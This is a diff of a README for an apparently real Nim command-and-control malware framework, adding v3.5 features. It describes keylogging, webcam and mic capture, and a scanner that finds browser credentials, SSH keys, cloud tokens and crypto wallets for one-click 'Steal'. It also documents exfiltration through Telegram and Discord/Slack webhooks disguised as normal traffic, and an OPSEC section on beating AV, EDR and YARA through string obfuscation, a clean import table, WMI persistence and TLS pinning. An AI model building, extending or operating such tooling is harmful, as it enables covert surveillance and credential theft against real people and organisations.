@@ -5,8 +5,123 @@
 > ETW suppression, keylogger, mic capture, webcam capture, clipboard monitor, registry + scheduled-task persistence,
 > screenshot, process list, clipboard, file search, browser / WiFi /
 > cloud-token / SSH-key exfil, EDR/AV recon, Telegram backup channel,
-> exfil) and a multi-agent operator console.
+> exfil), a multi-agent operator console, AND a real-time operator web
+> dashboard (dark-themed 3-pane UI with live WebSocket push).
 > Authorize before you point it anywhere.
+
+## What's new in v3.5 — Operator web dashboard + AI-style auto-drive
+
+This release adds an operator-grade web dashboard, geo-IP enrichment,
+operator→agent file upload, and an autonomous "auto-drive" discovery mode
+where the agent hunts for high-value loot on its own and the operator
+one-click exfiltrates findings.
+
+* **Operator web dashboard** (`http://server:8080/`)
+  * Dark, operator-grade 3-pane UI: agent list (left), live log stream
+    (center), agent state + files + loot (right). Real-time WebSocket
+    push on `ws://server:8081` (separate listener, auto-reconnecting
+    clients). Quick-action buttons for every toggle (keylog, mic,
+    webcam, clipwatch, autodrive), inline image/audio/text preview
+    overlay, toast notifications, command history in localStorage,
+    auto-scroll with pause-on-hover, connection status badge,
+    responsive layout. Cookie-based WebSocket auth so the browser can
+    carry the session on the upgrade handshake.
+  * REST API (port 8080, HTTP basic auth):
+    * `GET /api/agents` — agent list (with `remote` + `geo` per agent)
+    * `GET /api/state/<id>` — combined snapshot (system info, log
+      size, recent files sorted by mtime, remote, geo)
+    * `GET /api/log/<id>` — backfill for the live log stream
+    * `GET /api/files/<id>` — recent exfil files for the right pane
+    * `GET /api/loot/<id>` — cached auto-drive loot items
+    * `GET /downloads/<id>/<file>` — raw file download
+    * `POST /api/cmd` — queue a command (`{id, cmd, args}`)
+    * `POST /api/upload` — operator→agent chunked file upload
+      (`{id, path, data_b64, chunk_num, final}`)
+  * Server-side log subscriber infrastructure (`logSubs` + `logSubsLock`)
+    pushes new log lines to all connected dashboards via
+    `sendWsFrameSafe` (which catches every exception so an aborted
+    client socket can never crash the server).
+* **Auto-drive discovery mode** (agent-side scanner, no exfil)
+  * `autodrive start|stop` toggles a background scanner that walks
+    Windows user paths and reports high-value findings WITHOUT
+    exfiltrating anything. Each finding streams to the operator as
+    a `loot` JSON event: `{kind, path, short, label, size, mtime,
+    preview?}`.
+  * Scan categories: `browser` (Chrome/Edge/Firefox Login Data,
+    Cookies, Web Data, History, Bookmarks, Local State), `ssh`
+    (`id_rsa*`, `known_hosts`, `config`, `*.pub`), `cloud` (AWS
+    creds/config, GCP credentials, Azure CLI, Git credentials,
+    kubeconfig), `wallet` (ETH keystore, BTC `wallet.dat`),
+    `recent` (jump lists), `doc` (`.pdf`/`.docx`/`.xlsx`/`.txt`/
+    `.csv`/`.pem`/`.env` <10 MB in `~/Documents`).
+  * Dedupe via a per-agent audit file in `%TEMP%/.svc_audit` so only
+    new findings stream back. Runs every 60 s once started.
+  * Server stores loot per-agent (`lootStore` + `lootStoreLock`) and
+    exposes `GET /api/loot/<id>`. The dashboard renders loot cards
+    with a colored left border per kind (orange=browser, green=ssh,
+    blue=cloud, red=wallet, purple=doc), a "Steal" button, optional
+    preview text, and dedupe by path+kind on live push.
+  * One-click "Steal" issues a normal `download <path>` command —
+    intentional discovery-only-to-exfil split so the operator keeps
+    control of what actually leaves the wire.
+* **Operator→agent file upload UI**
+  * Dashboard "Upload" button → hidden `<input type="file">` → the
+    JS chunks the file into 512 KB base64 segments and POSTs each to
+    `/api/upload`. Progress via toast notifications + log lines.
+    `uploadInProgress` guard prevents concurrent uploads.
+  * Server-side `buildCmdExt` attaches extra JSON fields (`path`,
+    `data`, `final`) to the queued command so the agent's `upload`
+    handler receives the chunks in-band.
+* **Geo-IP enrichment**
+  * Server resolves each agent's remote IP via `ip-api.com` (free,
+    no key, HTTP, 45 req/min — cached per-IP in `geoCache` with
+    `geoCacheLock`). Private/loopback/link-local IPs short-circuit
+    to a `"private"` label so the dashboard shows `LAN` instead.
+  * `Thread[GeoJob]` with a `ref object` bridges the sync HTTP
+    lookup to the async Future (Nim's `createThread` requires
+    `{.thread, nimcall.}` procs — no closure capture, data passed
+    via thread argument).
+  * Geo-IP surfaced in `/api/agents`, `/api/state/<id>`, the WS
+    agent-list push, and quoted in the dashboard agent cards +
+    right pane (orange "Source IP" / blue "Location" / "ISP" /
+    "Org" / "Timezone" rows).
+* **Server uptime + host in header** — `up 1m 8s · 127.0.0.1:8080 ·
+  agents: 0` style metadata bar wired via WS so the dashboard header
+  re-renders without polling.
+* **Auto-select first agent on load** — when the WS agents handler
+  first reports a non-empty list and the dashboard's `activeId` is
+  null, it auto-calls `selectAgent(agents[0].id)`. Also graceful
+  switching when the active agent disconnects.
+* **Chromium URL-credentials fetch fix** — cookie `SameSite=Strict`
+  → `SameSite=Lax`, plus a JS shim with `location.replace()` that
+  strips credentials from the URL bar after auth so the browser
+  doesn't try to re-send the Basic header on the credentials fetch.
+* **Keylog toggle fix** — `keys start`/`keys stop` commands now
+  correctly toggle the keylogger; the server CLI alias `k` was
+  remapped to `keys` (it previously queued a `k` command the agent
+  couldn't parse). Keylogger captures real keystrokes including
+  `[BKSP]` for backspace.
+* **Dead-code cleanup** (~92 lines) — `wsUpgradeFromRequest`,
+  `wsLogHandler`, `wsAgentsHandler`, `SESSION_HEADERS`, `AsyncQueue`
+  + methods, `hexToBytes`, `PBKDF2_ITER`, unused imports removed.
+* **Python E2E test harness** (`tests/e2e_harness.py`)
+  * Simulates a real agent (raw-socket WebSocket + AES-256-GCM
+    crypto handshake) and drives the dashboard REST API to verify
+    every feature in one sweep.
+  * 26 assertions across: agent registration, all REST endpoints,
+    command dispatch (keys/shell), file chunk transfer, toggles,
+    upload, auto-drive + loot (browser/ssh discovery, steal =
+    download), panic/persist/ps. Run with:
+    `python tests/e2e_harness.py --start` (launches c2_server,
+    runs tests, kills it).
+
+* **OPSEC hardening pass (8 layered controls)** — see the dedicated
+  "OPSEC hardening (v3.5+)" section below. Highlights: dynamic DLL
+  loading (clean IAT), per-build rolling-key string obfuscation,
+  obfuscated `AGENT_SECRET`, TLS certificate pinning, WMI permanent
+  event subscription persistence (engagement+ variants), Discord /
+  Slack webhook beacon channel, dead-man's switch fail-safe
+  (`DEAD_MAN_SECS` default 30 days), zero build warnings.
 
 ## What's new in v3
 
@@ -60,18 +175,27 @@
 
 | Binary       | Source        | Flags                                                              | Size      |
 |--------------|---------------|--------------------------------------------------------------------|-----------|
-| `agent.exe`  | `agent.nim`   | `nim c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim` | ~810 KB   |
-| `c2_server.exe` | `c2_server.nim` | `nim c -d:release -d:ssl --threads:on c2_server.nim`            | ~948 KB   |
+| `agent_silent.exe` | `agent.nim` | `c -d:release -d:ssl --opt:size --app:gui --passL:-s` | ~0.94 MB |
+| `agent_engagement.exe` | `agent.nim` | `-d:variant_engagement` (above)                                | ~0.94 MB |
+| `agent_aggressive.exe` | `agent.nim` | `-d:variant_aggressive` (above)                                | ~0.95 MB |
+| `c2_server.exe` | `c2_server.nim` | `c -d:release -d:ssl --opt:size --app:gui --passL:-s`       | ~0.84 MB |
+
+> `build.ps1` regenerates `xorkey.nim` (random 16-byte rolling XOR key)
+> before each variant compile, so each binary's obfuscated strings are
+> unique. Final binaries have **only `KERNEL32.dll` + `msvcrt.dll`** in
+> their IAT (verified via `tests/pe_imports.py`).
 
 Verified on: **Nim 2.2.10** with **nimcrypto 0.7.3**, **winim 3.9.4**,
 **ws 0.6.0**, **MinGW gcc 6.3.0**.
 
 Smoke tests in this session:
-* `c2_server.exe` starts, binds `ws://127.0.0.1:443`, `BuildPrefix X7K` visible.
-* WebSocket handshake from `ClientWebSocket` → `State = Open`.
-* String audit on the binary: `amsi.dll` / `EtwEventWrite` / `wlan` /
-  `.aws` / `id_rsa` → **0 occurrences** in the binary.
-* v2's `tests/test_crypto.nim` still passes (9/9).
+* `c2_server.exe` starts, binds `ws://0.0.0.0:8443` (agent listener),
+  `http://0.0.0.0:8080/` (dashboard), `ws://0.0.0.0:8081` (dashboard
+  WS). `BuildPrefix X7K` visible.
+* WebSocket handshake from a simulated agent → registers and
+  receives AES-GCM encrypted commands. Verified end-to-end
+  with `tests/e2e_harness.py` (26/26 assertions pass).
+* All four agent binaries + c2_server build clean.
 
 ## Telegram backup C2
 
@@ -145,6 +269,9 @@ Registration:               HMAC-SHA256(secret, payload) once
 | `recon`     | `usb`                         | `USBSTOR` + `MountedDevices` registry |
 | `recon`     | `tasks`                       | `schtasks /query /v` |
 | `tg`        | (freeform text)               | Push a notification to the operator's Telegram bot |
+| `hook`      | (freeform text)               | Push a notification to the operator's Discord/Slack webhook (set `CLOUD_WEBHOOK_URL` at compile time, obfuscated) |
+| `autodrive` | `start` / `stop`              | Toggle the background loot-discovery scanner (see "Auto-drive" above). Reports findings as `loot` JSON events; the dashboard renders them as one-click "Steal" cards. |
+| `keys`      | `start` / `stop`              | Keylogger toggle (the dashboard "Keys" button uses this). The server alias `k` also maps here. |
 
 After an exfil, the operator runs `download <id> <staging-path>` to
 pull the staged files over the WSS channel. The full staging path
@@ -207,7 +334,54 @@ cd "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim"
 
 # Tests
 & "D:\appdata\nim-2.2.10\bin\nim.exe" c -r -d:release tests/test_crypto.nim
+
+# E2E harness (Python) — launches c2_server, simulates an agent,
+# and drives the dashboard REST API. 26/26 assertions pass.
+python tests/e2e_harness.py --start
 ```
+
+## Web dashboard
+
+Reporting-only view from the operator's laptop; the agent listener and
+the dashboard run as separate ports inside `c2_server.exe`:
+
+| Port | Protocol | Purpose |
+|------|----------|---------|
+| 8443 | WS (agent)  | Real agents connect here, do the HMAC + AES-GCM handshake |
+| 8080 | HTTP (basic auth) | Dashboard UI + REST API |
+| 8081 | WS (dashboard) | Real-time push to operator dashboards (agent list, log lines, loot events) |
+
+Open `http://<server>:8080/` in a browser, authenticate with
+`operator` / `S3nt1n3l-C2-D3v-Only-CHANGEME` (defaults — change before
+any real engagement, see the `WEB_AUTH_*` consts in `c2_server.nim`).
+
+Layout:
+* **Left pane** — agent cards with hostname, user, OS, privilege level,
+  geo-IP (`country, city`), local uptime, quick-action buttons
+  (Keys, Mic, Cam, Clip, Clipwatch, Screenshot, Upload, Auto-Drive).
+  Click a card to select; the first connected agent auto-selects on
+  dashboard load. If the active agent disconnects the dashboard
+  gracefully switches to the next one.
+* **Center pane** — live log stream (RES log backfill + WS real-time
+  push). Inputs at the bottom: command text field with `cmd`/`args`
+  split + a quick-action bar. Auto-scroll pauses on hover; connection
+  status badge lights up green/amber/red.
+* **Right pane** — three stacked sections:
+  1. **Agent State** — hostname, OS, user, privileges, uptime, log
+     size; orange "Source IP" + blue "Location/ISP/Org/Timezone" rows
+     from the geo-IP enrichment. Smart auto-refetch: when the active
+     agent's geo resolves via WS push, this section refreshes if it
+     doesn't already have geo rows.
+  2. **Files** — recent exfil files sorted by mtime with size + MIME
+     type. Click "Upload" to push a file back to the agent
+     (chunked 512 KB base64 segments). Click a file row to preview
+     inline (image → `<img>` overlay, audio → `<audio>`, text →
+     `<pre>`).
+  3. **Loot** — auto-drive discovery results rendered as cards with
+     a colored left border per kind (orange=browser, green=ssh,
+     blue=cloud, red=wallet, purple=doc), badge, label, path,
+     size+mtime, optional preview text, and a "Steal" button. Live
+     loot pushes dedupe by path+kind.
 
 ## Usage
 
@@ -272,6 +446,92 @@ X7K> tg 123456789012 high-value host pwned, see logs
 [<] 123456789012: [X7K] tg: ok
 # Operator's phone buzzes with the Telegram notification.
 ```
+
+## OPSEC hardening (v3.5+)
+
+The framework ships with eight layered hardening controls aimed at
+the most commonly signatured behaviors a static/dynamic AV scan or
+an EDR analyst will check.
+
+### 1. Dynamic DLL loading (mic + webcam)
+Both `winmm.dll` and `avicap32.dll` are resolved at runtime via
+`LoadLibraryA` + `GetProcAddress` with obfuscated DLL/proc names.
+Neither DLL appears in the agent's IAT — verified via
+`tests/pe_imports.py`. Only `KERNEL32.dll` and `msvcrt.dll` are
+statically imported.
+
+### 2. TLS certificate pinning (WSS)
+If `PINNED_CERT_PEM` is non-empty at compile time, the agent pins
+the WSS trust anchor to ONLY that certificate. The OS trust store
+is bypassed. Corporate TLS-inspection proxies presenting their own
+cert are rejected at the handshake; the agent retries failover
+URLs instead.
+
+### 3. Per-build rolling-key string obfuscation
+String literals (DLL names, registry paths, AMSI/ETW function names,
+wallet/SSH/cloud paths, the agent secret) are XOR-encoded at compile
+time with a 16-byte key. `build.ps1` generates a fresh random key
+before each agent variant compile, so the same plaintext produces
+different ciphertext in each binary. Defeats static string
+scanners and YARA rules.
+
+### 4. Obfuscated `AGENT_SECRET`
+The HMAC secret is stored as XOR'd ciphertext bytes in `.rdata` and
+only decrypted on first call into a runtime string. `strings.exe`
+and hex editors do not see it; the plaintext is reconstructed in
+heap memory transiently.
+
+### 5. Quiet persistence — WMI permanent event subscription
+`engagement` and `aggressive` variants skip `schtasks` + the HKCU
+Run key (both heavily signatured). Instead they create a
+`__EventFilter` + `CommandLineEventConsumer` +
+`__FilterToConsumerBinding` triple in `ROOT\subscription`, firing on
+`Win32_LogonSession` logon type 2 (interactive logon). The
+subscription lives in the CIM repository, not the registry or Task
+Scheduler. Cleanup tears down all three components by name on
+`selfCleanup`.
+
+### 6. Discord / Slack webhook beacon channel
+Optional `CLOUD_WEBHOOK_URL` (compile-time, obfuscated) — agent
+posts boot notifications, registration events, and operator
+`hook <text>` commands to a Discord or Slack incoming-webhook URL.
+Auto-detects format (`content` vs `text`) from the URL host. Blends
+with normal corporate HTTPS traffic to `discord.com` /
+`hooks.slack.com`, both of which are rarely DLP-flagged.
+
+### 7. Kill-switch fail-safe (dead-man's switch)
+Each successful C2 registration stamps `lastContact` into the
+encrypted meta blob. On every agent boot, if `now - lastContact >
+DEAD_MAN_SECS` (default 30 days) AND `lastContact > 0`, the agent
+calls `panicWipe()` — shreds meta + staged files, tears down all
+persistence, deletes its own copy, and exits. Prevents the agent
+from lingering after an engagement ends (C2 seized, operator lost
+access).
+
+### 8. Build warnings cleanup
+Zero unused-import, unused-symbol, or deprecation warnings in a
+clean `build.ps1` run. Each agent variant compiles with `[SuccessX]`
+in ~30 s and ends at 0.93–0.95 MB.
+
+### OPSEC trade-offs
+The framework survives 4–12 hours on lightly-monitored Windows
+hosts out of the box. For long-running engagements against
+moderately-monitored targets (Defender ATP, Elastic EDR), plan
+on the following additional measures on top of this baseline:
+- Custom per-engagement rolling key in `xorkey.nim` (already
+  supported by `build.ps1`; just delete the auto-generated file
+  and write your own).
+- TLS pinning against your own self-signed cert
+  (`PINNED_CERT_PEM` compile-time constant, full PEM).
+- Tuned `BEACON_INTERVAL` (10 s default → bump to minutes for
+  quiescent ops).
+- Custom `DEAD_MAN_SECS` per engagement.
+
+For "months on a hardened enterprise with CrowdStrike / Defender
+for Endpoint" the framework would need: in-memory-only execution
+(no on-disk copy), ETW suppression, AMSI bypass BEFORE first
+process spawn, encrypted command queue, and sleep + jitter
+obfuscation. These are out of scope for this build.
 
 ## Detection / hardening notes
 
